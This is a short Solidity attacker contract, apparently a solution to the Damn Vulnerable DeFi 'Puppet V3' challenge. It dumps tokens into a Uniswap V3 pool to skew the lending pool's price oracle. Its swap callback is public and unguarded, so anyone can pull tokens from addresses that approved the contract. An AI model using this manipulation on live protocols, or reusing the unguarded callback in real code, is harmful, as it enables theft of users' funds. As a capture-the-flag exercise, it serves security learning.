// SPDX-License-Identifier: MIT
pragma solidity =0.7.6;

import "@uniswap/v3-core/contracts/interfaces/IERC20Minimal.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
//import "@uniswap/v3-core/contracts/libraries/TransferHelper.sol";
//import "@uniswap/v3-periphery/contracts/libraries/OracleLibrary.sol";
import "./PuppetV3Pool.sol";


contract AttackerPuppetV3 {
    IERC20Minimal token; 
    IUniswapV3Pool uniswapV3Pool;
    uint160 constant MAX_SQRT_RATIO = 1461446703485210103287273052203988822378723970341;

    constructor(IERC20Minimal _token, IUniswapV3Pool _uniswapV3Pool) {
        token = _token;
        uniswapV3Pool = _uniswapV3Pool;
    }

    function swap(address _player, int256 _DVTAmount) public { 
        bytes memory playerAddress = abi.encode(_player);
        uniswapV3Pool.swap(_player, false, _DVTAmount, MAX_SQRT_RATIO, playerAddress);
    }

    function uniswapV3SwapCallback(int256 _amount0, int256 _amount1, bytes memory _data) public { 
        address player = abi.decode(_data, (address));
        token.transferFrom(player, msg.sender, uint(_amount1));
}
}